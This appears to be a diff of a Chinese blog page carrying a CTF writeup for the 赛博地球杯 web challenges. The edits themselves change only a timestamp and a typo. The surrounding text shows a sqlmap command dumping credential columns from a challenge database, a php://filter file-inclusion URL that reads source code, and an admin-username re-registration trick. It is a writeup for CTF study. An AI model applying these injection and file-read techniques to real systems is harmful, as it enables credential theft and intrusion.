@@ -37,7 +37,7 @@
 <meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/6.jpg">
 <meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/7.jpg">
 <meta property="og:image" content="http://cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/8.jpg">
-<meta property="og:updated_time" content="2019-03-03T14:30:42.949Z">
+<meta property="og:updated_time" content="2019-03-03T15:18:53.820Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="赛博地球杯网安大赛web部分Writeup">
 <meta name="twitter:description" content="0X00 前言&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;菜却坚强…… 0X01 大量设备报表不见了&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;爆破id">
@@ -207,7 +207,7 @@
 <p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump</p>
 </blockquote>
 <img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/4.jpg">
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号在登录进去就能getflag了<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/5.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/5.jpg"></p>
 <h1 id="0X03-工控云管理系统设备维护中心被植入后门"><a href="#0X03-工控云管理系统设备维护中心被植入后门" class="headerlink" title="0X03 工控云管理系统设备维护中心被植入后门"></a>0X03 工控云管理系统设备维护中心被植入后门</h1><p><a href="http://111.198.29.45:32548/index.php?page=index" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=index</a><br>看到这url第一反应就是文件包含</p>
 <blockquote>
 <p><a href="http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p>
